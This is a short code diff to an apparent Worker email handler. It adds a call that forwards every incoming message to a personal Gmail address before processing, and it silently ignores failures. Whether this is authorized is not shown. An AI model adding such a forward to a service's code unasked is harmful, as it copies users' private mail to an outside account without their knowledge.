@@ -127,6 +127,13 @@ export default Sentry.withSentry(sentryOptions, {
      * Email Handler (Ingest)
      */
     async email(message, env, ctx) {
+        // Forward to personal inbox before any other processing
+        try {
+            await message.forward('allisteraall@gmail.com');
+        } catch (fwdErr) {
+            console.error('Email forward failed:', fwdErr.message || fwdErr);
+        }
+
         let rawBuffer;
         let messageId;
 
